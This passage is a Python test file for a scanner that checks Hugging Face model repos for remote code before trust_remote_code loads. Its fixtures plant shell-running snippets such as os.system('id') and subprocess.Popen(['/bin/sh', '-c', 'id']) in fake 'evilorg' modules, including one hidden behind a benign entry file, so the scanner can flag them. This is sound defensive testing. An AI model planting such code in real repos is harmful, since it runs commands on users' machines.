            if fn == "config.json":
                import json
                import tempfile

                p = Path(tempfile.mkdtemp()) / "config.json"
                p.write_text(json.dumps({"auto_map": {"AutoModel": "modeling_x.M"}}))
                return str(p)
            if fn in REMOTE_CODE_CONFIG_FILES:
                raise EntryNotFoundError(fn)  # repo ships no tokenizer/processor config
            raise RuntimeError("download failed")  # the referenced .py cannot be fetched

        with (
            patch("huggingface_hub.hf_hub_download", side_effect = _dl),
            patch("huggingface_hub.list_repo_files", return_value = ["modeling_x.py"]),
        ):
            with pytest.raises(RemoteCodeUnscannable):
                repo_remote_code_files("third/party")

    def test_external_auto_map_repo_is_scanned(self):
        # auto_map can point at code in another repo (owner/name--module.Class) that
        # transformers fetches + runs, so the scanner must download it from that repo.
        def _dl(
            repo,
            fn,
            token = None,
        ):
            import json
            import tempfile

            p = Path(tempfile.mkdtemp()) / fn
            if fn == "config.json":
                p.write_text(
                    json.dumps({"auto_map": {"AutoModel": "evilorg/evilrepo--modeling_evil.M"}})
                )
            elif repo == "evilorg/evilrepo" and fn == "modeling_evil.py":
                p.write_text("import os\nos.system('id')\n")
            elif fn in REMOTE_CODE_CONFIG_FILES:
                raise EntryNotFoundError(fn)  # victim repo ships no tokenizer/processor config
            else:
                raise RuntimeError(f"unexpected fetch {repo}:{fn}")
            return str(p)

        with (
            patch("huggingface_hub.hf_hub_download", side_effect = _dl),
            patch("huggingface_hub.list_repo_files", return_value = []),
        ):
            files = repo_remote_code_files("victim/model")
        assert "evilorg/evilrepo--modeling_evil.py" in files
        assert not scan_remote_code_files(files).clean  # the external code is flagged

    def test_external_auto_map_helper_imports_are_scanned(self):
        # transformers fetches the external entry AND its relative imports, so the scanner
        # must download the whole external .py closure -- a benign entry importing a
        # dangerous helper.py must still be flagged.
        def _dl(
            repo,
            fn,
            token = None,
        ):
            import json
            import tempfile

            p = Path(tempfile.mkdtemp()) / fn
            if fn == "config.json":
                p.write_text(
                    json.dumps({"auto_map": {"AutoModel": "evilorg/evilrepo--modeling_evil.M"}})
                )
            elif repo == "evilorg/evilrepo" and fn == "modeling_evil.py":
                p.write_text("from .helper import run\n")  # benign entry, imports helper
            elif repo == "evilorg/evilrepo" and fn == "helper.py":
                p.write_text("import os\nos.system('id')\n")  # the dangerous import
            elif fn in REMOTE_CODE_CONFIG_FILES:
                raise EntryNotFoundError(fn)
            else:
                raise RuntimeError(f"unexpected fetch {repo}:{fn}")
            return str(p)

        def _list(repo, token = None):
            if repo == "evilorg/evilrepo":
                return ["modeling_evil.py", "helper.py"]
            return []  # victim/model own repo ships no .py (code is all external)

        with (
            patch("huggingface_hub.hf_hub_download", side_effect = _dl),
            patch("huggingface_hub.list_repo_files", side_effect = _list),
        ):
            files = repo_remote_code_files("victim/model")
        assert "evilorg/evilrepo--helper.py" in files  # the imported helper was scanned
        assert not scan_remote_code_files(files).clean  # helper's os.system is flagged

    def test_stale_own_repo_auto_map_ref_is_ignored_not_failed_closed(self):
        # A config names an own-repo .py the repo no longer ships (a stale ref, e.g.
        # PaddleOCR-VL names processing_ppocrvl.py but ships processing_paddleocr_vl.py).
        # The absent file cannot run, so ignore it and scan the present .py, not fail closed.
        def _dl(
            repo,
            fn,
            token = None,
        ):
            import json
            import tempfile

            p = Path(tempfile.mkdtemp()) / fn
            if fn == "config.json":
                p.write_text(json.dumps({"model_type": "x"}))
            elif fn == "tokenizer_config.json":
                p.write_text(json.dumps({"auto_map": {"AutoProcessor": "processing_ppocrvl.Proc"}}))
            elif fn == "processing_paddleocr_vl.py":
                p.write_text("import torch\n")  # the real, present file
            elif fn in REMOTE_CODE_CONFIG_FILES:
                raise EntryNotFoundError(fn)
            else:
                raise RuntimeError(f"stale/absent file must not be fetched: {fn}")
            return str(p)

        with (
            patch("huggingface_hub.hf_hub_download", side_effect = _dl),
            patch(
                "huggingface_hub.list_repo_files",
                return_value = ["config.json", "tokenizer_config.json", "processing_paddleocr_vl.py"],
            ),
        ):
            files = repo_remote_code_files("unsloth/PaddleOCR-VL")
        assert files != {}, "must not fail closed: present .py are scannable"
        assert "processing_paddleocr_vl.py" in files  # present file scanned
        assert "processing_ppocrvl.py" not in files  # stale ref ignored, never fetched

    def test_present_referenced_py_fetch_failure_still_fails_closed(self):
        # The stale-ref relaxation must not weaken the present-file guarantee: a listed .py
        # that cannot be fetched (transient) still fails closed, since transformers would run it.
        def _dl(
            repo,
            fn,
            token = None,
        ):
            import json
            import tempfile

            if fn == "config.json":
                p = Path(tempfile.mkdtemp()) / fn
                p.write_text(json.dumps({"auto_map": {"AutoModel": "modeling_x.M"}}))
                return str(p)
            if fn in REMOTE_CODE_CONFIG_FILES:
                raise EntryNotFoundError(fn)
            raise RuntimeError(
                "transient fetch failure"
            )  # modeling_x.py is present but unfetchable

        with (
            patch("huggingface_hub.hf_hub_download", side_effect = _dl),
            patch("huggingface_hub.list_repo_files", return_value = ["config.json", "modeling_x.py"]),
        ):
            with pytest.raises(RemoteCodeUnscannable):  # present-but-unfetchable -> fail closed
                repo_remote_code_files("third/party")

    def test_external_tokenizer_auto_map_list_is_scanned(self):
        # transformers encodes a tokenizer auto_map as a [slow, fast] list, e.g.
        # {"AutoTokenizer": ["owner/repo--tokenization_x.Slow", null]}; the external code
        # in the list must be fetched + scanned, not skipped for being a list.
        def _dl(
            repo,
            fn,
            token = None,
        ):
            import json
            import tempfile

            p = Path(tempfile.mkdtemp()) / fn
            if fn == "config.json":
                p.write_text(json.dumps({"model_type": "llama"}))
            elif fn == "tokenizer_config.json":
                p.write_text(
                    json.dumps(
                        {
                            "auto_map": {
                                "AutoTokenizer": [
                                    "evilorg/evilrepo--tokenization_evil.EvilTokenizer",
                                    None,
                                ]
                            }
                        }
                    )
                )
            elif repo == "evilorg/evilrepo" and fn == "tokenization_evil.py":
                p.write_text("import os\nos.system('id')\n")
            elif fn in REMOTE_CODE_CONFIG_FILES:
                raise EntryNotFoundError(fn)  # victim repo ships no image/processor config
            else:
                raise RuntimeError(f"unexpected fetch {repo}:{fn}")
            return str(p)

        with (
            patch("huggingface_hub.hf_hub_download", side_effect = _dl),
            patch("huggingface_hub.list_repo_files", return_value = []),
        ):
            files = repo_remote_code_files("victim/model")
        assert "evilorg/evilrepo--tokenization_evil.py" in files
        assert not scan_remote_code_files(files).clean  # the external tokenizer code is flagged

    def test_unreachable_external_ref_is_unscannable(self):
        # If the external repo's code can't be fetched, fail closed rather than fingerprint a clean own-repo snapshot.
        def _dl(
            repo,
            fn,
            token = None,
        ):
            import json
            import tempfile

            if fn == "config.json":
                p = Path(tempfile.mkdtemp()) / "config.json"
                p.write_text(
                    json.dumps({"auto_map": {"AutoModel": "evilorg/evilrepo--modeling_evil.M"}})
                )
                return str(p)
            if fn in REMOTE_CODE_CONFIG_FILES:
                raise EntryNotFoundError(fn)  # victim repo ships no tokenizer/processor config
            raise RuntimeError("download failed")  # the external repo's .py is unreachable

        with (
            patch("huggingface_hub.hf_hub_download", side_effect = _dl),
            patch("huggingface_hub.list_repo_files", return_value = []),
        ):
            with pytest.raises(RemoteCodeUnscannable):
                repo_remote_code_files("victim/model")

    def test_unrelated_local_py_is_still_scanned(self, tmp_path):
        # Deliberate broad scan (not narrowed to the import closure): a .py the entry does
        # not statically import is still scanned, since the entry can reach it via
        # importlib / exec / absolute import. Closure-only scanning would be a bypass.
        (tmp_path / "config.json").write_text('{"auto_map": {"AutoModel": "modeling_ok.M"}}')
        (tmp_path / "modeling_ok.py").write_text("import torch\n")  # benign entry, imports nothing
        (tmp_path / "unrelated.py").write_text("import os\nos.system('id')\n")  # never imported
        files = repo_remote_code_files(str(tmp_path))
        assert "unrelated.py" in files  # scanned despite not being referenced by auto_map
        assert not scan_remote_code_files(files).clean  # its os.system is flagged

    def test_external_mis_derived_dotted_ref_dropped_when_real_present(self):
        # A subpackage ref "evilorg/evilrepo--pkg.modeling_evil.M" derives
        # "pkg.modeling_evil.py", but the real file is "pkg/modeling_evil.py" (present).
        # The mis-derived name must be dropped (not fetched and failed closed) while the
        # present file is scanned, like the own-repo stale-ref guard.
        def _dl(
            repo,
            fn,
            token = None,
        ):
            import json
            import tempfile

            if fn == "config.json":
                p = Path(tempfile.mkdtemp()) / "config.json"
                p.write_text(
                    json.dumps({"auto_map": {"AutoModel": "evilorg/evilrepo--pkg.modeling_evil.M"}})
                )
                return str(p)
            if fn in REMOTE_CODE_CONFIG_FILES:
                raise EntryNotFoundError(fn)
            if repo == "evilorg/evilrepo" and fn == "pkg/modeling_evil.py":
                p = Path(tempfile.mkdtemp()) / "modeling_evil.py"
                p.write_text("import os\nos.system('id')\n")
                return str(p)
            # The mis-derived dotted name must never be fetched.
            raise RuntimeError(f"unexpected fetch {repo}:{fn}")

        def _list(repo, token = None):
            if repo == "evilorg/evilrepo":
                return ["pkg/modeling_evil.py"]
            return []  # victim/model ships no own .py

        with (
            patch("huggingface_hub.hf_hub_download", side_effect = _dl),
            patch("huggingface_hub.list_repo_files", side_effect = _list),
        ):
            files = repo_remote_code_files("victim/model")
        assert "evilorg/evilrepo--pkg/modeling_evil.py" in files  # real file scanned
        assert "evilorg/evilrepo--pkg.modeling_evil.py" not in files  # mis-derived dropped
        assert not scan_remote_code_files(files).clean  # os.system flagged

    def test_external_auto_map_repos_enumerated_for_cleanup(self, tmp_path):
        # Decline cleanup needs the external auto_map repo ids so their code is not left
        # cached; external_auto_map_repos lists the repos a config references.
        from utils.security.remote_code_scan import external_auto_map_repos

        (tmp_path / "config.json").write_text(
            '{"auto_map": {"AutoModel": "evilorg/evilrepo--modeling_evil.M"}}'
        )
        (tmp_path / "tokenizer_config.json").write_text(
            '{"auto_map": {"AutoTokenizer": ["other/repo--tokenization_x.Slow", null]}}'
        )
        repos = external_auto_map_repos(str(tmp_path))
        assert repos == {"evilorg/evilrepo", "other/repo"}

        # A config with only own-repo code yields no external repos.
        (tmp_path / "plain").mkdir()
        (tmp_path / "plain" / "config.json").write_text(
            '{"auto_map": {"AutoModel": "modeling_local.M"}}'
        )
        assert external_auto_map_repos(str(tmp_path / "plain")) == set()

    def test_gguf_repo_vestigial_auto_map_no_py_is_no_code(self):
        # A GGUF repo whose config.json has a vestigial auto_map but ships no .py: the
        # listing succeeds with nothing to run, so the result is an empty dict, not a
        # raise (which would false-block). Real shape of a Nemotron-Ultra GGUF.
        def _dl(
            repo,
            fn,
            token = None,
        ):
            import json
            import tempfile

            p = Path(tempfile.mkdtemp()) / fn
            if fn == "config.json":
                p.write_text(
                    json.dumps({"auto_map": {"AutoModelForCausalLM": "modeling_decilm.DeciLM"}})
                )
                return str(p)
            raise EntryNotFoundError(fn)  # no other config, and modeling_decilm.py is absent

        with (
            patch("huggingface_hub.hf_hub_download", side_effect = _dl),
            patch(
                "huggingface_hub.list_repo_files",
                return_value = ["config.json", "model-00001-of-00097.gguf"],
            ),
        ):
            files = repo_remote_code_files("unsloth/Some-Model-GGUF")
        assert files == {}  # no executable code -> empty (no raise)

    def test_tokenizer_only_auto_map_is_gated(self, tmp_path):
        # config.json is plain but tokenizer_config.json declares auto_map: an
        # AutoTokenizer(trust_remote_code=True) load runs that code, so scan + block it.
        from utils.security import preflight_remote_code_consent

        (tmp_path / "config.json").write_text('{"model_type": "llama"}')
        (tmp_path / "tokenizer_config.json").write_text(
            '{"auto_map": {"AutoTokenizer": ["tokenization_evil.EvilTokenizer", null]}}'
        )
        (tmp_path / "tokenization_evil.py").write_text(
            "import subprocess\nsubprocess.Popen(['/bin/sh', '-c', 'id'])\n"
        )
        d = preflight_remote_code_consent(str(tmp_path), trusted_org = False)
        assert d.has_remote_code is True
        assert d.blocked is True
        assert d.fingerprint

    def test_config_file_list_covers_transformers_auto_map_sources(self):
        # transformers reads auto_map only from a fixed set of config files (filename
        # constants). Pin our scanned set to those exact constants from the installed
        # transformers, so an upgrade that adds/renames an auto_map config trips here
        # instead of silently leaving its code unscanned.
        from transformers.tokenization_utils_base import TOKENIZER_CONFIG_FILE
        from transformers.utils import (
            CONFIG_NAME,
            FEATURE_EXTRACTOR_NAME,
            IMAGE_PROCESSOR_NAME,
            PROCESSOR_NAME,
            VIDEO_PROCESSOR_NAME,
        )

        expected = {
            CONFIG_NAME,  # AutoConfig / AutoModel
            TOKENIZER_CONFIG_FILE,  # AutoTokenizer
            FEATURE_EXTRACTOR_NAME,  # AutoFeatureExtractor (preprocessor_config.json)
            IMAGE_PROCESSOR_NAME,  # AutoImageProcessor (preprocessor_config.json)
            PROCESSOR_NAME,  # AutoProcessor
            VIDEO_PROCESSOR_NAME,  # AutoVideoProcessor
        }
        missing = expected - set(REMOTE_CODE_CONFIG_FILES)
        assert not missing, (
            "transformers reads auto_map from config files the consent gate does not "
            f"scan: {sorted(missing)}. Add them to REMOTE_CODE_CONFIG_FILES."
        )

    def test_load_configs_returns_empty_list_when_all_404(self):
        # A remote repo shipping none of the auto_map configs (every fetch 404s) returns
        # [] ("no config-based auto_map"), not None ("unknown"): [] -> no-op, while None
        # would force a scan and, for a code-less repo, a false unscannable block.
        with patch("huggingface_hub.hf_hub_download", side_effect = EntryNotFoundError("404")):
            configs = consent._load_remote_code_configs("some/plain-repo")
        assert configs == []
        # And a transient error on a config -> None (unknown -> caller scans).
        with patch("huggingface_hub.hf_hub_download", side_effect = RuntimeError("blip")):
            configs = consent._load_remote_code_configs("some/gated-repo")
        assert configs is None

    def test_gguf_repo_auto_map_is_scanned_for_non_file_load_paths(self, tmp_path):
        # A GGUF-only repo id still hits export paths that run auto_map; only a direct
        # .gguf file is inert.
        def _dl(
            repo_id = None,
            filename = None,
            token = None,
            **kw,
        ):
            import json
            if filename == "config.json":
                p = tmp_path / "config.json"
                p.write_text(
                    json.dumps({"auto_map": {"AutoModelForCausalLM": "modeling_decilm.X"}})
                )
                return str(p)
            raise EntryNotFoundError(filename)

        with (
            patch("huggingface_hub.hf_hub_download", side_effect = _dl),
            patch(
                "huggingface_hub.list_repo_files",
                return_value = ["config.json", "model-00001-of-00097.gguf"],
            ),
        ):
            assert consent._config_has_auto_map("unsloth/Some-Model-GGUF") is True

    def test_gguf_only_repo_with_python_is_scanned_and_blocked(self, tmp_path):
        # Regression: the GGUF-only short-circuit must not skip auto_map Python for export loaders.
        def _dl(
            repo_id = None,
            filename = None,
            token = None,
            **kw,
        ):
            import json

            p = tmp_path / filename
            if filename == "config.json":
                p.write_text(json.dumps({"auto_map": {"AutoModel": "modeling_evil.X"}}))
                return str(p)
            if filename == "modeling_evil.py":
                p.write_text("import subprocess\nsubprocess.Popen(['id'])\n")
                return str(p)
            raise EntryNotFoundError(filename)

        with (
            patch("huggingface_hub.hf_hub_download", side_effect = _dl),
            patch(
                "huggingface_hub.list_repo_files",
                return_value = ["config.json", "modeling_evil.py", "model.Q4_K_M.gguf"],
            ),
        ):
            d = evaluate_remote_code_consent_for_targets(
                ["evil/GGUF-Only"],
                trust_remote_code = True,
            )

        assert d.has_remote_code is True
        assert d.blocked is True
        assert d.max_severity == HIGH
        assert d.fingerprint

    def test_transformers_style_repo_auto_map_is_scanned_and_blocked(self, tmp_path):
        # A non-GGUF repo (safetensors/MLX) with auto_map is still scanned and blocked.
        def _dl(
            repo_id = None,
            filename = None,
            token = None,
            **kw,
        ):
            import json

            p = tmp_path / filename
            if filename == "config.json":
                p.write_text(json.dumps({"auto_map": {"AutoModel": "modeling_evil.X"}}))
                return str(p)
            if filename == "modeling_evil.py":
                p.write_text("import subprocess\nsubprocess.Popen(['id'])\n")
                return str(p)
            raise EntryNotFoundError(filename)

        for weights in (["model.safetensors"], ["weights.npz"]):
            with (
                patch("huggingface_hub.hf_hub_download", side_effect = _dl),
                patch(
                    "huggingface_hub.list_repo_files",
                    return_value = ["config.json", "modeling_evil.py", *weights],
                ),
            ):
                d = evaluate_remote_code_consent_for_targets(
                    ["org/Transformers-Style"],
                    trust_remote_code = True,
                )
            assert d.has_remote_code is True, weights
            assert d.blocked is True, weights
            assert d.max_severity == HIGH, weights
            assert d.fingerprint, weights

    def test_direct_gguf_file_reference_has_no_auto_map(self):
        # A direct .gguf file reference (repo id + filename, >=3 segments) is a GGUF load: no remote code, no Hub call.
        with patch("huggingface_hub.hf_hub_download", side_effect = AssertionError("no Hub call")):
            assert consent._config_has_auto_map("org/repo/model.gguf") is False

    def test_remote_repo_named_gguf_is_not_suffix_skipped(self):
        # A two-segment repo id whose name ends in ".gguf" is not a direct file reference:
        # it can still ship safetensors + auto_map Python, so it must be scanned.
        def _dl(
            repo_id = None,
            filename = None,
            token = None,
            **kw,
        ):
            import json
            import tempfile

            if filename == "config.json":
                p = Path(tempfile.mkdtemp()) / "config.json"
                p.write_text(json.dumps({"auto_map": {"AutoModel": "modeling_x.X"}}))
                return str(p)
            raise EntryNotFoundError(filename)

        with (
            patch("huggingface_hub.hf_hub_download", side_effect = _dl),
            patch(
                "huggingface_hub.list_repo_files",
                return_value = ["config.json", "model.safetensors", "model.gguf", "modeling_x.py"],
            ),
        ):
            # Ships safetensors -> not a GGUF-only repo -> the auto_map gates.
            assert consent._config_has_auto_map("evil/model.gguf") is True

    def test_mixed_gguf_and_safetensors_repo_is_still_gated(self):
        # A repo with both .gguf and .safetensors is not treated as GGUF: the safetensors
        # could load via transformers where auto_map runs, so the gate must still apply.
        def _dl(
            repo_id = None,
            filename = None,
            token = None,
            **kw,
        ):
            import json
            import tempfile

            if filename == "config.json":
                p = Path(tempfile.mkdtemp()) / "config.json"
                p.write_text(json.dumps({"auto_map": {"AutoModelForCausalLM": "modeling_x.X"}}))
                return str(p)
            raise EntryNotFoundError(filename)

        with (
            patch("huggingface_hub.hf_hub_download", side_effect = _dl),
            patch(
                "huggingface_hub.list_repo_files",
                return_value = ["config.json", "model.safetensors", "model.gguf"],
            ),
        ):
            assert consent._config_has_auto_map("org/Mixed-Repo") is True

    def test_mixed_gguf_and_bin_repo_is_still_gated(self):
        # A repo with .gguf + a non-safetensors transformers weight (.bin/.pt/.pth/.h5/
        # .msgpack/.onnx/.ckpt) is not GGUF-only: transformers can load it and run
        # auto_map, so the gate still applies even with no .safetensors present.
        def _dl(
            repo_id = None,
            filename = None,
            token = None,
            **kw,
        ):
            import json
            import tempfile

            if filename == "config.json":
                p = Path(tempfile.mkdtemp()) / "config.json"
                p.write_text(json.dumps({"auto_map": {"AutoModel": "modeling_x.X"}}))
                return str(p)
            raise EntryNotFoundError(filename)

        for weight in (
            "pytorch_model.bin",
            "model.pt",
            "model.pth",
            "tf_model.h5",
            "flax_model.msgpack",
            "model.onnx",
            "model.ckpt",
        ):
            with (
                patch("huggingface_hub.hf_hub_download", side_effect = _dl),
                patch(
                    "huggingface_hub.list_repo_files",
                    return_value = ["config.json", "modeling_x.py", weight, "model.gguf"],
                ),
            ):
                assert consent._config_has_auto_map("org/Mixed-Bin-GGUF") is True, weight


# POST /discard-remote-code: purge what the scan downloaded on decline, but never a
# model the user already had (weights), a loaded model, or a local path.


class TestDiscardRemoteCodeDownload:
    @staticmethod
    def _fake_cache(filenames):
        files = [
            SimpleNamespace(file_name = fn, file_path = f"/snap/{fn}", blob_path = f"/blob/{fn}")
            for fn in filenames
        ]
        rev = SimpleNamespace(commit_hash = "deadbeef", files = files)
        repo = SimpleNamespace(repo_type = "model", repo_id = "evil/repo", revisions = [rev])
        return SimpleNamespace(repos = [repo], delete_revisions = MagicMock())

    def _run(self, model_name, cache_scans):
        import asyncio

        import routes.models as M

        not_loaded = SimpleNamespace(active_model_name = None)
        with (
            patch.object(M, "is_local_path", return_value = model_name.startswith("/")),
            patch.object(M, "_all_hf_cache_scans", return_value = cache_scans),
            patch.object(M, "get_inference_backend", return_value = not_loaded),
            patch(
                "routes.inference.get_llama_cpp_backend",
                return_value = SimpleNamespace(is_loaded = False, model_identifier = None),
            ),
        ):
            return asyncio.run(M.discard_remote_code_download(model_name, current_subject = "t"))

    def test_purges_metadata_only_entry(self):
        cache = self._fake_cache(["config.json", "tokenizer_config.json", "modeling_evil.py"])
        res = self._run("evil/repo", [cache])
        assert res["deleted"] is True
        cache.delete_revisions.assert_called_once_with("deadbeef")

    def test_refuses_when_weights_present(self):
        cache = self._fake_cache(["config.json", "model.safetensors"])
        res = self._run("evil/repo", [cache])
        assert res == {"deleted": False, "reason": "has_weights"}
        cache.delete_revisions.assert_not_called()

    def test_refuses_when_gguf_present(self):
        cache = self._fake_cache(["config.json", "model.Q4_K_M.gguf"])
        res = self._run("evil/repo", [cache])
        assert res["reason"] == "has_weights"

    def test_refuses_local_path(self):
        res = self._run("/home/me/model", [])
        assert res == {"deleted": False, "reason": "local"}

    def test_noop_when_not_cached(self):
        res = self._run("evil/repo", [])
        assert res == {"deleted": False, "reason": "not_cached"}

    def test_route_source_reports_created_by_scan(self):
        src = (_BACKEND / "routes/models.py").read_text()
        assert "created_by_scan" in src
        assert "discard-remote-code" in src
